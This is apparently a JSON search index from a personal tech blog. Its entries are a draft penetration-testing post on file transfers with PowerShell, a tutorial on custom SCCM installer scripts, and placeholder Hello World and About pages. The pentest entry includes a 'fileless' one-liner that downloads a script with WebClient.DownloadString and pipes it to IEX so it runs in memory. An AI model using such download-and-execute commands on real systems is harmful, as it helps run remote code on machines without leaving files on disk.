[{"content":"The Basics Windows Download Files using Powershell The esiast way to download files using Powershell is to use the Net.WebClient class. This class provides a intuitive way to download HTTP HTTPS and FTP files.\n$webClient = New-Object System.Net.WebClient $webClient.DownloadFile(\u0026#34;http://example.com/file.txt\u0026#34;, \u0026#34;C:\\path\\to\\file.txt\u0026#34;) Ofcourse, you can also use the Invoke-WebRequest cmdlet which is the windows equivalent of curl or wget. The DownloadFile method is used to download a file to a specified location.\nInvoke-WebRequest -Uri \u0026#34;http://example.com/file.txt\u0026#34; -OutFile \u0026#34;C:\\path\\to\\file.txt\u0026#34; # or curl -Uri \u0026#34;http://example.com/file.txt\u0026#34; -OutFile \u0026#34;C:\\path\\to\\file.txt\u0026#34; # or wget -Uri \u0026#34;http://example.com/file.txt\u0026#34; -OutFile \u0026#34;C:\\path\\to\\file.txt\u0026#34; Download Fileless using Powershell In very rare cases, you may need to download a file without writing it to disk. This can be done using the Net.WebClient class and the DownloadString method. The IEX command can be used to execute the downloaded script.\n$webClient = New-Object System.Net.WebClient $webClient.DownloadString(\u0026#34;http://example.com/file.txt\u0026#34;) | IEX ","permalink":"//localhost:1313/posttobe/filetransfers/","summary":"The Basics Windows Download Files using Powershell The esiast way to download files using Powershell is to use the Net.WebClient class. This class provides a intuitive way to download HTTP HTTPS and FTP files.\n$webClient = New-Object System.Net.WebClient $webClient.DownloadFile(\u0026#34;http://example.com/file.txt\u0026#34;, \u0026#34;C:\\path\\to\\file.txt\u0026#34;) Ofcourse, you can also use the Invoke-WebRequest cmdlet which is the windows equivalent of curl or wget. The DownloadFile method is used to download a file to a specified location.","title":"File Transfers for Penetration Testing"},{"content":" The Basics The following script is useful for creating custom installers and uninstallers in Powershell. The advantage to creating script installers versus uploading a regular exe or msi into MEM/SCCM is that a script installer allows for fine-grained control over the installation process. This is especially useful when dealing with porly written installers.\nAt the end of this article, I will provide a full break down of the script section by section.\nFull Script Example Snippets Command Line Arguments param ( [Alias(\u0026#34;silent\u0026#34;)] [switch]$s, [Alias(\u0026#34;uninstall\u0026#34;, \u0026#34;uninst\u0026#34;, \u0026#34;u\u0026#34;)] [switch]$x ) Command line arguments can be passed to a Powershell script by using the param block at the beginning of the script. This block allows you to define the parameters that the script will accept. In this example, the script accepts two parameters: $silent and $uninstall. These parameters can be passed to the script when it is run from the command line. For example, .\\script.ps1 -silent \u0026quot;true\u0026quot; -uninstall \u0026quot;true\u0026quot;. We use the [Alias()] attribute to define aliases for the parameters. This allows us to use different names for the parameters when running the script. For example, -s can be aliased to -silent, -u can be aliased to -uninstall. We also do not define a parameter for install, as the script will default to installing the program if no parameters are passed.\nDefine Imutable Variables Set-Variable -Name \u0026#34;AppVendor\u0026#34; -Value \u0026#34;Google\u0026#34; -Option Constant Set-Variable -Name \u0026#34;AppName\u0026#34; -Value \u0026#34;Chrome\u0026#34; -Option Constant Set-Variable -Name \u0026#34;AppVersion\u0026#34; -Value \u0026#34;126.0.6478.127\u0026#34; -Option Constant Set-Variable -Name \u0026#34;AppDisplayName\u0026#34; -Value \u0026#34;Google Chrome\u0026#34; -Option Constant Set-Variable -Name \u0026#34;AppDisplayVersion\u0026#34; -Value \u0026#34;126.0.6478.127\u0026#34; -Option Constant Set-Variable -Name \u0026#34;AppGUID\u0026#34; -Value \u0026#34;{A6A8A820-1396-378F-ABE5-4EBDEA19FE69}\u0026#34; -Option Constant Set-Variable -Name \u0026#34;AppLogName\u0026#34; -Value \u0026#34;${AppVendor}_${AppName}_${AppVersion}.log\u0026#34; -Option Constant Set-Variable -Name \u0026#34;LogPath\u0026#34; -Value \u0026#34;${Env:windir}\\LogansLogs\u0026#34; -Option Constant By using the -Option Constant flag, we are making these variables immutable, meaning that they cannot be changed once they are set. This is useful for defining constants that will be used throughout the script, following the DRY principle (Do Not Repeat Yourself). The benefit of using constants is that they provide a single point of control for values that are used multiple times in the script, allowing us to use the variables with certainty that the value will not change.\nIt is important to note that we are not repearing values. Insted they are two types of variables here that can be diferent from each other:\nLogging purposes: AppName, AppVersion Program purposes: AppDisplayName, AppDisplayVersion Logging if (-not (Test-Path -Path $LogPath)) { New-Item -Path $LogPath -ItemType Directory -Force } if (Test-Path -Path \u0026#34;${LogPath}\\${AppLogName}\u0026#34;) { Remove-Item -Path \u0026#34;${LogPath}\\${AppLogName}\u0026#34; -Force } if (-not (Test-Path -Path \u0026#34;${LogPath}\\${AppLogName}\u0026#34;)) { New-Item -Path \u0026#34;${LogPath}\\${AppLogName}\u0026#34; -ItemType File -Force } Here we add a function that will check for the existence of a log file and create one if it does not exist, additioanlly we will need to have the function create a log folder if it does not exist.\nCheck to see if the program is already installed $installed = $false # Check 64-bit registry $regPath64 = \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\$appGUID\u0026#34; if (Test-Path -Path $regPath64) { $app = Get-ItemProperty -Path $regPath64 write-host \u0026#34;App: $($app.DisplayName) $($app.DisplayVersion)\u0026#34; if ($app.DisplayName -eq $AppDisplayName -and $app.DisplayVersion -eq $AppDisplayVersion) { $installed = $true } } # Check 32-bit registry if not already found if (-not $installed) { $regPath32 = \u0026#34;HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\$appGUID\u0026#34; if (Test-Path -Path $regPath32) { $app = Get-ItemProperty -Path $regPath32 if ($app.DisplayName -eq $AppDisplayName -and $app.DisplayVersion -eq $AppDisplayVersion) { $installed = $true } } } Error Handling When Calling External Programs try { # Running the msiexec program with example parameters $processInfo = Start-Process msiexec.exe -ArgumentList \u0026#34;/i C:\\Path\\To\\Your\\Installer.msi /quiet /norestart\u0026#34; -Wait -PassThru # Checking the exit code of the process if ($processInfo.ExitCode -eq 0) { Write-Host \u0026#34;Installation succeeded without requiring a reboot.\u0026#34; } elseif ($processInfo.ExitCode -eq 3010) { Write-Host \u0026#34;Installation succeeded but a reboot is required.\u0026#34; # Restart-Computer (restart the computer now) # $restart = $true (restart the computer later and using the $restart variable) } else { throw \u0026#34;Installation failed with exit code $($processInfo.ExitCode).\u0026#34; } } catch { # If an exception is thrown in the try block, it\u0026#39;s caught here. Write-Host \u0026#34;An error occurred: $_\u0026#34; # Additional error handling can be performed here if needed. } The key takeaway from this script is the use of the try and catch blocks. The try block will attempt to run the code within the block. If an error occurs, the catch block will catch the error and run the code within the block. This is useful when calling external programs that may not return a 0 exit code when they run successfully. For example, the msiexec program will return a 0 exit code when it runs successfully, but it may return a 3010 exit code if a reboot is required. By using the try and catch blocks, we can catch the 3010 exit code and handle it accordingly.\nAdditional Snippets Automagically Uninstall Programs # Retrieve uninstall information from the registry $programsToUninstall = Get-ChildItem -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall, HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall | # Extract properties of each registry key Get-ItemProperty | # Filter to only include items where the DisplayName matches \u0026#34;Program Name\u0026#34; Where-Object { ($_.DisplayName -match \u0026#34;Program Name\u0026#34;)} | # Select the UninstallString and DisplayName for further processing Select-Object UninstallString, DisplayName This script will search the registry for installed programs that have a displayname that matches \u0026ldquo;Program Name\u0026rdquo; and return the uninstall string and display name for each program into the $programsToUninstall array. There is a few ways that we can expand this script to be more useful. For example,\nAdding a foreach loop to modify the uninstall string to include the /quiet or -s flag (depending on the program that we are unisntalling). This will allow us to silently uninstall the program. Add more Select-Object properties to the script to include the displayVersion of the program. This will allow us to create fine-grained uninstall scripts that can target specific versions of a program. Additionally, we can use this information to add to a custom log file. ","permalink":"//localhost:1313/posts/sccm_powershell/","summary":"The Basics The following script is useful for creating custom installers and uninstallers in Powershell. The advantage to creating script installers versus uploading a regular exe or msi into MEM/SCCM is that a script installer allows for fine-grained control over the installation process. This is especially useful when dealing with porly written installers.\nAt the end of this article, I will provide a full break down of the script section by section.","title":"Create Custom Installers/Uninstallers Using Powershell For MEM/SCCM"},{"content":"Line Text This is my blog\nCode print(\u0026#34;Hello World\u0026#34;) Youtube comments hello world\nBig Title Medium Title Small Title Smaller Title Smallest Title Tiny Title ","permalink":"//localhost:1313/helloworld/","summary":"Line Text This is my blog\nCode print(\u0026#34;Hello World\u0026#34;) Youtube comments hello world\nBig Title Medium Title Small Title Smaller Title Smallest Title Tiny Title ","title":"Hello World"},{"content":"Hi there! \u0026#x1f44b; My name is Logan and I am a technology enthusiast! I have a passion for learning new technologies and sharing my knowledge with others. Feel free to browse my blog posts and leave a comment if you have any questions or feedback.\n","permalink":"//localhost:1313/about/","summary":"Hi there! \u0026#x1f44b; My name is Logan and I am a technology enthusiast! I have a passion for learning new technologies and sharing my knowledge with others. Feel free to browse my blog posts and leave a comment if you have any questions or feedback.","title":""}]